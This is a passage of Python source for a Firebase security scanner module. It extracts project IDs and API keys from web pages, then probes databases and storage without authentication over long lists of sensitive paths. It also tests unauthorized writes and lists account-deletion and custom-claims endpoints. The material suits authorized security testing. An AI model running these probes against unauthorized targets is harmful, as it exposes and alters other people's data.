#!/usr/bin/env python3
# modules/Web/firebase_scanner.py

import requests
import json
import re
import time
from urllib.parse import urlparse, urljoin
from pathlib import Path
from typing import List, Optional, Dict, Tuple
import subprocess
import base64
import hmac
import hashlib

# Try different import methods
try:
    from core.base import ToolModule
    from core.colors import Colors
except ImportError:
    # Fallback classes if core modules are not found
    class ToolModule:
        def __init__(self):
            # Minimal __init__ as required
            self.name = "FirebaseScannerFallback"
            self.category = "Web"
            self.command = "firebase-scanner-fallback"
            self.description = "Fallback Firebase Scanner due to missing core modules."
            self.dependencies = ["python3-requests"]

        def _get_name(self) -> str:
            return self.name

        def _get_category(self) -> str:
            return self.category

        def _get_command(self) -> str:
            return self.command

        def _get_description(self) -> str:
            return self.description

        def _get_dependencies(self) -> List[str]:
            return self.dependencies

        def check_installation(self) -> bool:
            # Minimal check, assumes python3-requests is the main concern
            try:
                import requests
                return True
            except ImportError:
                print("Error: 'requests' module not found for fallback.")
                return False

        def run_guided(self) -> None:
            print("Error: Core modules not found. Guided mode unavailable for FirebaseScanner.")

        def run_direct(self) -> None:
            print("Error: Core modules not found. Direct mode unavailable for FirebaseScanner.")

        def get_help(self) -> dict:
            return {
                "title": self._get_name(),
                "desc": self._get_description(),
                "modes": {
                    "Guided": "Unavailable (core modules missing)",
                    "Direct": "Unavailable (core modules missing)"
                },
                "dependencies": self._get_dependencies()
            }

    class Colors:
        CYAN = ""
        GREEN = ""
        WARNING = ""
        FAIL = ""
        ENDC = ""
        BOLD = ""
        RED = ""
        YELLOW = ""

class FirebaseScannerModule(ToolModule):
    # API Endpoints - Templates
    FIREBASE_CONFIG_PATTERNS = [
        r'firebase\.initializeApp\(\s*({[^}]+})',
        r'var\s+firebaseConfig\s*=\s*({[^}]+})',
        r'const\s+firebaseConfig\s*=\s*({[^}]+})',
        r'"firebaseConfig":\s*({[^}]+})'
    ]
    FIREBASE_PROJECT_ID_URL_PATTERNS = [
        r'https://([^.]+)\.firebaseapp\.com',
        r'https://([^.]+)\.web\.app',
        r'projectId["\s]*[:=]["\s]*([^"\'\\s,}]+)'
    ]
    RTDB_URL_TEMPLATES = [ # Note: {project_id}
        "https://{project_id}-default-rtdb.firebaseio.com/",
        "https://{project_id}-default-rtdb.europe-west1.firebasedatabase.app/",
        "https://{project_id}-default-rtdb.asia-southeast1.firebasedatabase.app/",
        "https://{project_id}-default-rtdb.us-central1.firebasedatabase.app/",
        "https://{project_id}.firebaseio.com/",  # Legacy format
    ]
    FIRESTORE_BASE_URL_TEMPLATE = "https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents" # Note: {project_id}
    STORAGE_URL_TEMPLATES = [ # Note: {project_id}
        "https://firebasestorage.googleapis.com/v0/b/{project_id}.appspot.com/o",
        "https://storage.googleapis.com/{project_id}.appspot.com"
    ]
    # Templates requiring api_key
    IDENTITY_TOOLKIT_SIGNUP_ENDPOINT_TEMPLATE = "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}"
    IDENTITY_TOOLKIT_SIGNUP_NEW_USER_ENDPOINT_TEMPLATE = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/signupNewUser?key={api_key}"
    IDENTITY_TOOLKIT_LOOKUP_ENDPOINT_TEMPLATE = "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}"
    IDENTITY_TOOLKIT_GET_ACCOUNT_INFO_ENDPOINT_TEMPLATE = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key={api_key}"
    IDENTITY_TOOLKIT_DELETE_ENDPOINT_TEMPLATE = "https://identitytoolkit.googleapis.com/v1/accounts:delete?key={api_key}"
    IDENTITY_TOOLKIT_DELETE_ACCOUNT_ENDPOINT_TEMPLATE = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/deleteAccount?key={api_key}"
    IDENTITY_TOOLKIT_UPDATE_ENDPOINT_TEMPLATE = "https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
    SECURETOKEN_REFRESH_ENDPOINT_TEMPLATE = "https://securetoken.googleapis.com/v1/token?key={api_key}"
    IDENTITY_TOOLKIT_SEND_OOB_CODE_ENDPOINT_TEMPLATE = "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={api_key}"
    IDENTITY_TOOLKIT_SET_CUSTOM_CLAIMS_ENDPOINT_TEMPLATE = "https://identitytoolkit.googleapis.com/v1/projects/{project_id}:setCustomUserClaims?key={api_key}"
    IDENTITY_TOOLKIT_LINK_WITH_OAUTH_ENDPOINT_TEMPLATE = "https://identitytoolkit.googleapis.com/v1/accounts:linkWithOAuth?key={api_key}"

    # Templates requiring project_id
    CLOUD_FUNCTION_URL_TEMPLATE = "https://{region}-{project_id}.cloudfunctions.net/{func_name}"
    FIREBASE_PROJECT_API_URL_TEMPLATE = "https://firebase.googleapis.com/v1beta1/projects/{project_id}"
    
    # Paths and Static URLs
    FIREBASE_APP_URL_BASE_TEMPLATE = "https://{project_id}.firebaseapp.com" # Note: {project_id}
    WEB_APP_URL_BASE_TEMPLATE = "https://{project_id}.web.app" # Note: {project_id}
    FIREBASE_INIT_JSON_PATH = "/__/firebase/init.json"
    FIREBASE_CONFIG_JS_PATH = "/firebase-config.js"
    FIREBASE_CONFIG_JSON_PATH = "/__/firebase/config.json"
    SERVICE_ACCOUNT_KEY_JSON_PATH = "/service-account-key.json"
    FIREBASE_ADMINSDK_JSON_PATH = "/firebase-adminsdk.json"
    DOT_ENV_PATH = "/.env"
    SECURETOKEN_API_URL = "https://www.googleapis.com/robot/v1/metadata/x509/securetoken@system.gserviceaccount.com"

    # Common Names & Patterns - Lists
    COMMON_SENSITIVE_RTDB_PATHS = ['users', 'user', 'admin', 'config', 'settings', 'private', 'secret']
    COMMON_FIRESTORE_COLLECTIONS = ['users', 'user', 'admin', 'settings', 'config', 'private']
    SENSITIVE_STORAGE_FILE_PATTERNS = [
        r'.*\.key$', r'.*\.pem$', r'.*\.p12$', r'.*\.json$',
        r'.*config.*', r'.*secret.*', r'.*private.*',
        r'.*backup.*', r'.*dump.*', r'.*\.sql$'
    ]
    COMMON_CONFIG_FILE_NAMES = [ # Relative paths for use with urljoin or direct concatenation
        '/.env', '/config.json', '/firebase.json', '/.firebaserc',
        '/admin-config.json', '/service-account.json'
    ]
    COMMON_CLOUD_FUNCTION_NAMES = [
        'api', 'webhook', 'admin', 'test', 'debug', 'dev',
        'upload', 'download', 'process', 'sync', 'backup',
        'user', 'auth', 'login', 'register', 'verify'
    ]
    COMMON_CLOUD_FUNCTION_REGIONS = ['us-central1', 'europe-west1', 'asia-east1'] # Example regions
    COMMON_USER_ID_PATTERNS = [
        'user1', 'user2', 'user3', 'admin', 'test', 'demo',
        '1', '2', '3', '100', 'admin1', 'test1',
        'administrator', 'root', 'support'
    ]
    DEFAULT_EMAIL_DOMAINS = ['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com']
    DEFAULT_EMAIL_USERNAMES = ['admin', 'administrator', 'test', 'user', 'support', 'info', 'contact', 'root', 'demo']
    TEST_REFERRERS = [
        'https://malicious-site.com', 'https://evil.com', 
        'http://localhost:3000', 'https://attacker.firebaseapp.com'
    ]

    USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'

    def __init__(self):
        super().__init__()
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.USER_AGENT})
        self.vulnerabilities = []
        self.project_id = None
        self.api_key = None
        self.database_url = None

    def _make_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """
        Makes an HTTP request using the appropriate session method.
        Includes basic error handling for requests.exceptions.RequestException.
        """
        try:
            session_method = getattr(self.session, method.lower())
            response = session_method(url, **kwargs)
            return response
        except requests.exceptions.RequestException as e:
            # Constructing the error message to match existing style
            error_msg_parts = str(e).split('\n')
            short_error = error_msg_parts[0] # Typically the most concise part
            if len(error_msg_parts) > 1:
                short_error += "..."

            print(f"{Colors.WARNING}[!] Could not connect to {url}: {short_error}{Colors.ENDC}")
            # Attempt to provide more detail if available, e.g. connection refused
            if "Connection refused" in str(e):
                 print(f"{Colors.WARNING}[!] Detail: Connection refused by the server at {urlparse(url).netloc}.{Colors.ENDC}")
            elif "timed out" in str(e).lower():
                 print(f"{Colors.WARNING}[!] Detail: Request to {url} timed out.{Colors.ENDC}")

            return None
        except AttributeError:
            print(f"{Colors.FAIL}[!] Invalid HTTP method specified for _make_request: {method}{Colors.ENDC}")
            return None

    def _format_vulnerability(self, type: str, severity: str, url: str, description: str, 
                              evidence: str = "", impact: str = "", exploitation: str = "") -> Dict:
        """Formats a vulnerability dictionary consistently."""
        vuln = {
            'type': type,
            'severity': severity,
            'url': url,
            'description': description,
        }
        if evidence:
            vuln['evidence'] = evidence
        if impact:
            vuln['impact'] = impact
        if exploitation:
            vuln['exploitation'] = exploitation
        return vuln
        
    def _get_name(self) -> str:
        return "Firebase Scanner"

    def _get_category(self) -> str:
        return "Web"

    def _get_command(self) -> str:
        return "firebase-scanner"

    def _get_description(self) -> str:
        return "Comprehensive Firebase security scanner for misconfigurations and vulnerabilities"

    def _get_dependencies(self) -> List[str]:
        return ["python3", "python3-requests"]

    def _get_script_path(self) -> str:
        return ""

    def get_help(self) -> dict:
        return {
            "title": "Firebase Scanner - Firebase Security Assessment",
            "usage": "use firebase-scanner",
            "desc": "Comprehensive security scanner for Firebase applications that checks for common misconfigurations, exposed databases, authentication bypasses, and other vulnerabilities.",
            "modes": {
                "Guided": "Interactive mode with step-by-step configuration",
                "Direct": "Direct command execution with custom parameters"
            },
            "features": {
                "Database Security": "Check for open Realtime Database and Firestore",
                "Authentication Bypass": "Test for weak authentication rules",
                "Storage Misconfiguration": "Scan Firebase Storage for exposed files",
                "API Key Exposure": "Validate API key restrictions",
                "Admin SDK": "Test for exposed admin endpoints",
                "Cloud Functions": "Enumerate and test cloud functions",
                "Hosting": "Check for source code exposure in hosting",
                "Exploitation": "Active exploitation of found vulnerabilities"
            },
            "examples": [
                'Scan project: my-firebase-project',
                'Full scan with API key: my-firebase-project --api-key AIzaSyBv...',
                'Database only: my-project --database-only',
                'Exploit vulnerabilities: exploit my-project AIza...'
            ],
            "notes": [
                "Requires either project ID or full Firebase URL",
                "API key helps with deeper scanning but not required",
                "Some tests may trigger Firebase security alerts",
                "Use responsibly and only on authorized targets"
            ]
        }

    def _show_banner(self):
        print(f'''
{Colors.CYAN}╔══════════════════════════════════════════╗
║           FIREBASE SCANNER               ║
║     "Firebase Security Assessment"       ║
║         Misconfiguration Hunter          ║
╚══════════════════════════════════════════╝{Colors.ENDC}

{Colors.YELLOW}⚠️  Use only on authorized Firebase projects ⚠️{Colors.ENDC}
''')

    def _extract_firebase_config(self, url_or_project: str) -> bool:
        """Enhanced Firebase configuration extraction with multiple detection methods"""
        try:
            if url_or_project.startswith('http'):
                # Method 1: Original config extraction from page content
                if self._extract_firebase_config_from_page(url_or_project):
                    return True
                
                # Method 2: NEW - Network traffic analysis 
                if self._extract_from_network_requests(url_or_project):
                    return True
                
                # Method 3: NEW - JavaScript source analysis
                if self._extract_from_javascript_sources(url_or_project):
                    return True
                    
            else:
                # Treat as project ID
                self.project_id = url_or_project
                print(f"{Colors.GREEN}[✓] Using project ID: {self.project_id}{Colors.ENDC}")
                return True
                
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error extracting Firebase config: {e}{Colors.ENDC}")
            
        return False

    def _extract_firebase_config_from_page(self, url: str) -> bool:
        """Original method - extract from page HTML/JS"""
        try:
            response = self.session.get(url, timeout=10)
            content = response.text
            
            # Look for Firebase config in the page (código original)
            for pattern in self.FIREBASE_CONFIG_PATTERNS:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    try:
                        json_str = match.group(1)
                        json_str = re.sub(r'(\w+):', r'"\1":', json_str)
                        json_str = re.sub(r"'", '"', json_str)
                        
                        config = json.loads(json_str)
                        
                        self.project_id = config.get('projectId')
                        self.api_key = config.get('apiKey')
                        self.database_url = config.get('databaseURL')
                        
                        if self.project_id:
                            print(f"{Colors.GREEN}[✓] Firebase config extracted from URL{Colors.ENDC}")
                            print(f"    Project ID: {self.project_id}")
                            return True
                    except json.JSONDecodeError:
                        continue
            
            # Try URL patterns if config not found
            for pattern in self.FIREBASE_PROJECT_ID_URL_PATTERNS:
                match = re.search(pattern, url + content)
                if match:
                    self.project_id = match.group(1)
                    print(f"{Colors.GREEN}[✓] Project ID extracted: {self.project_id}{Colors.ENDC}")
                    return True
                    
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error in page extraction: {e}{Colors.ENDC}")
        return False

    def _extract_from_network_requests(self, base_url: str) -> bool:
        """NEW - Extract Firebase project info from network patterns (like your HTTP example)"""
        print(f"{Colors.CYAN}[*] Analyzing network patterns for Firebase services...{Colors.ENDC}")
        
        try:
            response = self.session.get(base_url, timeout=10)
            if response.status_code != 200:
                return False
                
            content = response.text
            
            # NEW: Look for Firestore patterns (like your example)
            firestore_patterns = [
                r'database=projects%2F([a-zA-Z0-9\-_]+)%2F',  # URL encoded
                r'projects[%/]([a-zA-Z0-9\-_]+)[%/]databases',  # General pattern
                r'/v1/projects/([a-zA-Z0-9\-_]+)/',  # API calls
                r'google\.firestore\.v1\.Firestore',  # Service detection
            ]
            
            for pattern in firestore_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    potential_project_id = matches[0]
                    if self._validate_project_id(potential_project_id):
                        self.project_id = potential_project_id
                        print(f"{Colors.GREEN}[✓] Project ID found via network analysis: {self.project_id}{Colors.ENDC}")
                        return True
            
            # Look for other Firebase patterns
            project_patterns = [
                r'"projectId":\s*"([a-zA-Z0-9\-_]+)"',
                r'projectId["\s]*[:=]["\s]*([a-zA-Z0-9\-_]+)',
                r'https://([a-zA-Z0-9\-_]+)\.firebaseapp\.com',
                r'https://([a-zA-Z0-9\-_]+)\.web\.app',
                r'https://([a-zA-Z0-9\-_]+)-default-rtdb\.firebaseio\.com',
            ]
            
            for pattern in project_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    potential_project_id = matches[0]
                    if self._validate_project_id(potential_project_id):
                        self.project_id = potential_project_id
                        print(f"{Colors.GREEN}[✓] Project ID found in source: {self.project_id}{Colors.ENDC}")
                        return True
            
            # Look for API keys
            api_key_patterns = [
                r'"apiKey":\s*"(AIza[0-9A-Za-z\-_]{35})"',
                r'apiKey["\s]*[:=]["\s]*(AIza[0-9A-Za-z\-_]{35})',
                r'key=(AIza[0-9A-Za-z\-_]{35})',
            ]
            
            for pattern in api_key_patterns:
                matches = re.findall(pattern, content)
                if matches:
                    self.api_key = matches[0]
                    print(f"{Colors.GREEN}[✓] API key extracted: {self.api_key[:10]}...{Colors.ENDC}")
            
        except Exception as e:
            print(f"{Colors.WARNING}[!] Network analysis error: {e}{Colors.ENDC}")
        
        return False

    def _extract_from_javascript_sources(self, base_url: str) -> bool:
        """NEW - Extract Firebase config from JavaScript files"""
        print(f"{Colors.CYAN}[*] Analyzing JavaScript sources for Firebase config...{Colors.ENDC}")
        
        try:
            response = self.session.get(base_url, timeout=10)
            if response.status_code != 200:
                return False
                
            content = response.text
            
            # Find JavaScript file references
            js_patterns = [
                r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']',
                r'<script[^>]+src=["\']([^"\']*firebase[^"\']*)["\']',
            ]
            
            js_urls = []
            for pattern in js_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                js_urls.extend(matches)
            
            # Analyze JavaScript files
            for js_url in js_urls[:5]:  # Limit to first 5 files
                if not js_url.startswith('http'):
                    from urllib.parse import urljoin
                    js_url = urljoin(base_url, js_url)
                
                try:
                    js_response = self.session.get(js_url, timeout=5)
                    if js_response.status_code == 200:
                        if self._analyze_javascript_content(js_response.text):
                            return True
                except:
                    continue
                    
        except Exception as e:
            print(f"{Colors.WARNING}[!] JavaScript analysis error: {e}{Colors.ENDC}")
        
        return False

    def _analyze_javascript_content(self, content: str) -> bool:
        """NEW - Analyze JavaScript content for Firebase patterns"""
        # Look for your specific pattern and others
        patterns = [
            r'database=projects%2F([a-zA-Z0-9\-_]+)%2F',  # Your example pattern
            r'projects[%/]([a-zA-Z0-9\-_]+)[%/]databases',
            r'projectId\s*[:=]\s*["\']([a-zA-Z0-9\-_]+)["\']',
            r'firebase\.initializeApp\s*\(\s*({[^}]+})',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                if isinstance(matches[0], str):
                    potential_project = matches[0]
                else:
                    potential_project = matches[0][0] if matches[0] else None
                    
                if potential_project and self._validate_project_id(potential_project):
                    self.project_id = potential_project
                    print(f"{Colors.GREEN}[✓] Project ID found in JavaScript: {self.project_id}{Colors.ENDC}")
                    return True
        
        return False

    def _validate_project_id(self, project_id: str) -> bool:
        """NEW - Validate if a string looks like a valid Firebase project ID"""
        if not project_id or len(project_id) < 3 or len(project_id) > 30:
            return False
        
        if not re.match(r'^[a-z0-9\-]+$', project_id):
            return False
        
        if project_id.startswith('-') or project_id.endswith('-'):
            return False
        
        # Common invalid patterns
        invalid_patterns = ['www', 'http', 'https', 'api', 'test123', 'example']
        if project_id in invalid_patterns:
            return False
        
        return True

    def _test_realtime_database(self) -> List[Dict]:
        """Enhanced Realtime Database testing with deeper enumeration"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
        
        print(f"\n{Colors.CYAN}[*] Enhanced Realtime Database Testing...{Colors.ENDC}")
        
        # Expanded list of database URL patterns
        db_urls = []
        
        # Standard patterns
        for template in self.RTDB_URL_TEMPLATES:
            db_urls.append(template.format(project_id=self.project_id))
        
        # Additional regional patterns often missed
        additional_regions = [
            f"https://{self.project_id}-default-rtdb.europe-west1.firebasedatabase.app/",
            f"https://{self.project_id}-default-rtdb.asia-southeast1.firebasedatabase.app/",
            f"https://{self.project_id}-default-rtdb.us-central1.firebasedatabase.app/",
            f"https://{self.project_id}-rtdb.firebaseio.com/",  # Alternative naming
            f"https://{self.project_id}-prod.firebaseio.com/",  # Production naming
            f"https://{self.project_id}-dev.firebaseio.com/",   # Development naming
            f"https://{self.project_id}-staging.firebaseio.com/", # Staging naming
        ]
        db_urls.extend(additional_regions)
        
        if self.database_url:
            db_urls.insert(0, self.database_url.rstrip('/') + '/')
        
        # MASSIVELY EXPANDED path list - this is where real vulns are found
        sensitive_paths = [
            # Root and common collections
            '', 'users', 'user', 'profiles', 'accounts', 'members',
            
            # Admin and configuration
            'admin', 'admins', 'administrators', 'config', 'configuration', 'settings',
            'private', 'internal', 'system', 'management', 'dashboard',
            
            # Authentication related
            'auth', 'authentication', 'sessions', 'tokens', 'keys', 'secrets',
            'passwords', 'credentials', 'login', 'signin', 'oauth',
            
            # Business data
            'orders', 'payments', 'transactions', 'billing', 'invoices',
            'customers', 'clients', 'contacts', 'leads', 'sales',
            
            # Application data
            'messages', 'chats', 'conversations', 'notifications', 'posts',
            'comments', 'reviews', 'ratings', 'feedback', 'reports',
            
            # File and media
            'files', 'uploads', 'media', 'images', 'documents', 'attachments',
            
            # Analytics and logs
            'analytics', 'logs', 'events', 'tracking', 'metrics', 'stats',
            'errors', 'debug', 'monitoring', 'performance',
            
            # Development and testing
            'test', 'tests', 'dev', 'development', 'staging', 'prod', 'production',
            'backup', 'backups', 'exports', 'imports', 'temp', 'temporary',
            
            # API and services
            'api', 'endpoints', 'services', 'webhooks', 'callbacks',
            
            # E-commerce specific
            'products', 'inventory', 'categories', 'cart', 'wishlist',
            'discounts', 'coupons', 'promotions',
            
            # Social features
            'friends', 'followers', 'following', 'likes', 'shares', 'votes',
            
            # Content management
            'content', 'articles', 'pages', 'blog', 'news', 'announcements',
            
            # Location and mapping
            'locations', 'places', 'coordinates', 'addresses', 'routes',
            
            # Real-time features
            'realtime', 'live', 'status', 'presence', 'online',
            
            # Form data
            'forms', 'submissions', 'surveys', 'responses', 'feedback',
            
            # Security and permissions
            'permissions', 'roles', 'groups', 'access', 'authorization',
            
            # Common naming patterns
            'data', 'items', 'records', 'entries', 'collection', 'list'
        ]
        
        for db_url_base in db_urls:
            db_url_base = db_url_base.rstrip('/') + '/'
            print(f"{Colors.CYAN}[*] Testing database: {db_url_base}{Colors.ENDC}")
            
            for path in sensitive_paths:
                test_url = f"{db_url_base}{path}.json"
                
                response = self._make_request('GET', test_url, timeout=10)
                if not response:
                    continue
                
                if response.status_code == 200:
                    content = response.text
                    if content and content.strip().lower() != 'null' and len(content.strip()) > 2:
                        try:
                            data = json.loads(content)
                            data_size = len(str(data)) if data else 0
                            
                            if data_size > 50:  # Significant data
                                severity = self._calculate_severity(path, data, data_size)
                                
                                vulnerabilities.append(self._format_vulnerability(
                                    type='Open Realtime Database Path',
                                    severity=severity,
                                    url=test_url,
                                    description=f'Path "{path}" accessible without auth ({data_size} chars)',
                                    evidence=self._format_evidence(data),
                                    impact=self._assess_impact(path, data)
                                ))
                                
                                print(f"{Colors.FAIL}[!] {severity}: {path} - {data_size} chars{Colors.ENDC}")
                                
                                # Test write access
                                if self._test_write_access(db_url_base, path):
                                    vulnerabilities.append(self._format_vulnerability(
                                        type='Database Write Access',
                                        severity='CRITICAL',
                                        url=f"{db_url_base}{path}.json",
                                        description=f'Path "{path}" allows unauthorized writes',
                                        evidence='Write test successful',
                                        impact='Data can be modified or deleted without authentication'
                                    ))
                        
                        except json.JSONDecodeError:
                            # Still might be valuable non-JSON data
                            if len(content) > 100:
                                vulnerabilities.append(self._format_vulnerability(
                                    type='Database Content Exposure',
                                    severity='MEDIUM',
                                    url=test_url,
                                    description=f'Non-JSON content in path "{path}"',
                                    evidence=content[:200] + '...' if len(content) > 200 else content,
                                    impact='Potential data exposure or misconfiguration'
                                ))
        
        return vulnerabilities

    def _test_write_access(self, db_base_url: str, path: str) -> bool:
        """Test if we can write to a database path"""
        test_data = {
            'scanner_test': {
                'timestamp': int(time.time()),
                'test': True,
                'note': 'Security scan test - please secure your database'
            }
        }
        
        write_url = f"{db_base_url}{path}/scanner_test_{int(time.time())}.json"
        
        write_resp = self._make_request('PUT', write_url, json=test_data['scanner_test'], timeout=5)
        if write_resp and write_resp.status_code == 200:
            # Clean up our test data
            self._make_request('DELETE', write_url, timeout=3)
            return True
        
        return False

    def _format_evidence(self, data: any) -> str:
        """Format evidence from data while protecting sensitive info"""
        data_str = str(data)
        
        # Look for interesting patterns without exposing full data
        patterns = []
        
        if 'email' in data_str.lower():
            patterns.append('Contains email addresses')
        if 'password' in data_str.lower():
            patterns.append('Contains password references')
        if '@' in data_str:
            patterns.append('Contains email-like strings')
        if re.search(r'\d{10,}', data_str):
            patterns.append('Contains long numeric values (possibly phone/ID numbers)')
        
        evidence = f"Data size: {len(data_str)} chars"
        if patterns:
            evidence += f", Patterns: {', '.join(patterns)}"
        
        # Include small sample if not too sensitive
        if len(data_str) < 500 and not any(word in data_str.lower() for word in ['password', 'secret', 'key']):
            evidence += f", Sample: {data_str[:100]}..."
        
        return evidence

    def _calculate_severity(self, path: str, data: any, data_size: int) -> str:
        """Calculate vulnerability severity based on path and data content"""
        # Critical paths
        critical_indicators = ['admin', 'password', 'secret', 'key', 'token', 'credential', 'private']
        if any(indicator in path.lower() for indicator in critical_indicators):
            return 'CRITICAL'
        
        # High severity for large datasets or user data
        if data_size > 10000 or 'user' in path.lower() or 'email' in str(data).lower():
            return 'HIGH'
        
        # Medium for moderate data
        if data_size > 1000:
            return 'MEDIUM'
        
        return 'LOW'

    def _assess_impact(self, path: str, data: any) -> str:
        """Assess the impact of exposed data"""
        data_str = str(data).lower()
        
        if any(sensitive in data_str for sensitive in ['password', 'email', 'phone', 'address', 'ssn', 'credit']):
            return 'PII and sensitive data exposure - potential privacy violations and identity theft'
        
        if 'admin' in path.lower() or 'config' in path.lower():
            return 'Administrative data exposure - potential system compromise'
        
        if any(business in data_str for business in ['payment', 'order', 'transaction', 'billing']):
            return 'Business data exposure - financial and operational impact'
        
        return 'General data exposure - potential privacy impact'

    def _test_firestore(self) -> List[Dict]:
        """Enhanced Firestore testing with collection enumeration"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
        
        print(f"\n{Colors.CYAN}[*] Enhanced Firestore Testing...{Colors.ENDC}")
        
        # Multiple Firestore endpoints to test
        firestore_endpoints = [
            f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents",
            f"https://firestore.googleapis.com/v1beta1/projects/{self.project_id}/databases/(default)/documents",
            f"https://firestore.googleapis.com/v1beta2/projects/{self.project_id}/databases/(default)/documents",
            f"https://{self.project_id}.firebaseio.com/firestore/documents",  # Alternative endpoint
        ]
        
        # Expanded collection names to test
        collections_to_test = [
            # Standard collections
            'users', 'user', 'profiles', 'accounts', 'members', 'people',
            
            # Admin collections
            'admin', 'admins', 'administrators', 'config', 'settings', 'system',
            
            # Business collections
            'orders', 'products', 'inventory', 'customers', 'payments', 'transactions',
            
            # Content collections
            'posts', 'articles', 'comments', 'messages', 'notifications', 'chats',
            
            # App-specific collections (try variations)
            'data', 'items', 'records', 'entries', 'content', 'files', 'media',
            
            # Development collections
            'test', 'dev', 'debug', 'logs', 'analytics', 'metrics'
        ]
        
        for base_endpoint in firestore_endpoints:
            print(f"{Colors.CYAN}[*] Testing Firestore endpoint: {base_endpoint}{Colors.ENDC}")
            
            # Test root access
            response = self._make_request('GET', base_endpoint, timeout=10)
            if response and response.status_code == 200:
                vulnerabilities.append(self._format_vulnerability(
                    type='Open Firestore Database',
                    severity='CRITICAL',
                    url=base_endpoint,
                    description='Firestore allows unauthorized root access',
                    evidence='HTTP 200 response to root documents endpoint',
                    impact='Complete database access without authentication'
                ))
                
                # If root is open, try to enumerate actual collections
                try:
                    root_data = response.json()
                    if 'documents' in root_data:
                        print(f"{Colors.FAIL}[!] CRITICAL: Firestore root accessible with documents!{Colors.ENDC}")
                except:
                    pass
            
            # Test specific collections
            for collection in collections_to_test:
                collection_url = f"{base_endpoint}/{collection}"
                coll_resp = self._make_request('GET', collection_url, timeout=5)
                
                if coll_resp and coll_resp.status_code == 200:
                    try:
                        coll_data = coll_resp.json()
                        doc_count = len(coll_data.get('documents', []))
                        
                        vulnerabilities.append(self._format_vulnerability(
                            type='Exposed Firestore Collection',
                            severity='HIGH' if 'admin' in collection or 'user' in collection else 'MEDIUM',
                            url=collection_url,
                            description=f'Collection "{collection}" accessible ({doc_count} documents)',
                            evidence=f'Documents found: {doc_count}',
                            impact=f'Collection data exposure for "{collection}"'
                        ))
                        
                        print(f"{Colors.WARNING}[!] Collection '{collection}': {doc_count} documents{Colors.ENDC}")
                        
                    except json.JSONDecodeError:
                        # Non-JSON response but still accessible
                        vulnerabilities.append(self._format_vulnerability(
                            type='Firestore Collection Access',
                            severity='MEDIUM',
                            url=collection_url,
                            description=f'Collection "{collection}" returns non-JSON data',
                            evidence=coll_resp.text[:200] + '...' if len(coll_resp.text) > 200 else coll_resp.text,
                            impact='Potential data exposure or misconfiguration'
                        ))
        
        return vulnerabilities

    def _test_storage(self) -> List[Dict]:
        """Enhanced Firebase Storage testing with deeper enumeration"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
        
        print(f"\n{Colors.CYAN}[*] Enhanced Storage Testing...{Colors.ENDC}")
        
        # Multiple storage endpoints and naming patterns
        storage_patterns = [
            f"https://firebasestorage.googleapis.com/v0/b/{self.project_id}.appspot.com/o",
            f"https://firebasestorage.googleapis.com/v0/b/{self.project_id}-default.appspot.com/o",
            f"https://firebasestorage.googleapis.com/v0/b/{self.project_id}-prod.appspot.com/o",
            f"https://firebasestorage.googleapis.com/v0/b/{self.project_id}-dev.appspot.com/o",
            f"https://firebasestorage.googleapis.com/v0/b/{self.project_id}-staging.appspot.com/o",
            f"https://storage.googleapis.com/{self.project_id}.appspot.com",
            f"https://storage.cloud.google.com/{self.project_id}.appspot.com",
        ]
        
        # Test different file/folder patterns
        common_paths = [
            '',  # Root
            'uploads', 'files', 'documents', 'images', 'media', 'photos',
            'user-uploads', 'profile-images', 'avatars', 'attachments',
            'admin', 'private', 'internal', 'config', 'backup', 'exports',
            'temp', 'cache', 'logs', 'reports', 'data'
        ]
        
        for storage_url in storage_patterns:
            print(f"{Colors.CYAN}[*] Testing storage: {storage_url}{Colors.ENDC}")
            
            # Test root bucket access
            response = self._make_request('GET', storage_url, timeout=10)
            if not response:
                continue
                
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'items' in data and data['items']:
                        file_count = len(data['items'])
                        vulnerabilities.append(self._format_vulnerability(
                            type='Open Firebase Storage',
                            severity='HIGH',
                            url=storage_url,
                            description=f'Storage bucket allows file listing ({file_count} files)',
                            evidence=f"Listed {file_count} files in root bucket",
                            impact='File enumeration and potential data exposure'
                        ))
                        
                        print(f"{Colors.FAIL}[!] HIGH: {file_count} files listed in storage{Colors.ENDC}")
                        
                        # Analyze files for sensitive content
                        self._analyze_storage_files(data['items'], storage_url, vulnerabilities)
                        
                except json.JSONDecodeError:
                    # Non-JSON but accessible
                    if len(response.text) > 100:
                        vulnerabilities.append(self._format_vulnerability(
                            type='Storage Bucket Access',
                            severity='MEDIUM',
                            url=storage_url,
                            description='Storage bucket returns non-JSON content',
                            evidence=response.text[:200] + '...',
                            impact='Storage misconfiguration or alternative listing format'
                        ))
            
            # Test specific paths
            for path in common_paths:
                if path:
                    path_url = f"{storage_url}/{path}" if storage_url.endswith('/o') else f"{storage_url}/{path}"
                    path_resp = self._make_request('GET', path_url, timeout=5)
                    
                    if path_resp and path_resp.status_code == 200:
                        vulnerabilities.append(self._format_vulnerability(
                            type='Exposed Storage Path',
                            severity='MEDIUM' if path in ['admin', 'private', 'config'] else 'LOW',
                            url=path_url,
